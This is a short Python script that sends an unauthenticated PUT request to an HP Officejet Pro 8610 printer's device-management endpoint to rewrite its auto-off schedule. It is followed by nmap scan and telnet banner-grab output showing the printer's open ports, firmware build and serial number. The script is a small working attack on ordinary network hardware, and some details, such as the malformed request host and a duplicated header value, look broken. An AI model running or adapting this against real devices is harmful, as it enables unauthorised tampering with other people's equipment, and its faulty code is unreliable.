__author__ = 'N05F3R4TU'
import http.client

ip = "192.168.223.1"

connection =  http.client.HTTPConnection('{}:80'.format(ip))
headers = {"Content-type": "Content-Type: text/xml", "Accept": "*/*"}
body_content = '<prdcfgdyn2:ProductConfigDyn xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:dd="http://www.hp.com/schemas/imaging/con/dictionaries/1.0/" xmlns:prdcfgdyn2="http://www.hp.com/schemas/imaging/con/ledm/productconfigdyn/2009/03/16" xmlns:prdcfgdyn="http://www.hp.com/schemas/imaging/con/ledm/productconfigdyn/2007/11/05" xsi:schemaLocation="http://www.hp.com/schemas/imaging/con/ledm/productconfigdyn/2009/03/16 ../schemas/ledm2/ProductConfigDyn.xsd                               http://www.hp.com/schemas/imaging/con/ledm/productconfigdyn/2007/11/05 ../schemas/ProductConfigDyn.xsd                               http://www.hp.com/schemas/imaging/con/dictionaries/1.0/ ../schemas/dd/DataDictionaryMasterLEDM.xsd"><prdcfgdyn2:ProductSettings><dd:ScheduledOffScheduledOnTime><dd:ScheduledOff><dd:AutoOffTimeSetting>enabled</dd:AutoOffTimeSetting><dd:AutoOffTimeAndDaySetting><dd:AutoOffTimeValue>19:00:00</dd:AutoOffTimeValue><dd:DaysOfWeek>sunday</dd:DaysOfWeek></dd:AutoOffTimeAndDaySetting><dd:Deferred>false</dd:Deferred></dd:ScheduledOff><dd:ScheduledOn><dd:AutoOnTimeSetting>disabled</dd:AutoOnTimeSetting><dd:AutoOnTimeAndDaySetting><dd:AutoOnTimeValue>00:00:00</dd:AutoOnTimeValue></dd:AutoOnTimeAndDaySetting></dd:ScheduledOn></dd:ScheduledOffScheduledOnTime></prdcfgdyn2:ProductSettings></prdcfgdyn2:ProductConfigDyn>'
connection.request('PUT', 'http://{}.100/DevMgmt/ProductConfigDyn.xml'.format(ip), body_content, headers)
result = connection.getresponse()
print(result.status, result.reason)



"""
MacBook-Pro-van-N05F3R4TU:[ HP ] N05F3R4TU$ nmap 192.168.223.0/24

Starting Nmap 6.47 ( http://nmap.org ) at 2015-11-18 14:29 CET
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.223.1
Host is up (0.032s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE
80/tcp   open  http
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
515/tcp  open  printer
631/tcp  open  ipp
6839/tcp open  unknown
7435/tcp open  unknown
8080/tcp open  http-proxy
9100/tcp open  jetdirect
9220/tcp open  unknown

Nmap scan report for 192.168.223.100
Host is up (0.00018s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
7777/tcp open  cbt

Nmap done: 256 IP addresses (2 hosts up) scanned in 11.01 seconds
MacBook-Pro-van-N05F3R4TU:[ HP ] N05F3R4TU$ telnet 192.168.223.0 80
Trying 192.168.223.0...
telnet: connect to address 192.168.223.0: Permission denied
telnet: Unable to connect to remote host
MacBook-Pro-van-N05F3R4TU:[ HP ] N05F3R4TU$ telnet 192.168.223.1 80
Trying 192.168.223.1...
Connected to 192.168.223.1.
Escape character is '^]'.
GET / HTTP/1.1

HTTP/1.1 200 OK
Server: HP HTTP Server; HP HP Officejet Pro 8610 - A7F64A; Serial Number: CN57VF33H2; Built:Fri Jan 09, 2015 04:48:51PM {FDP1CN1502AR}
Content-Encoding: gzip
Content-Type: text/html
Last-Modified: Fri, 09 Jan 2015 16:48:51 GMT
Cache-Control: max-age=0
Set-Cookie: sid=s8bdd6921-add07f9e8af0df1d34a603f942a989a5;path=/;
X-Frame-Options: SAMEORIGIN
Content-Language: en
Content-Length: 748
"""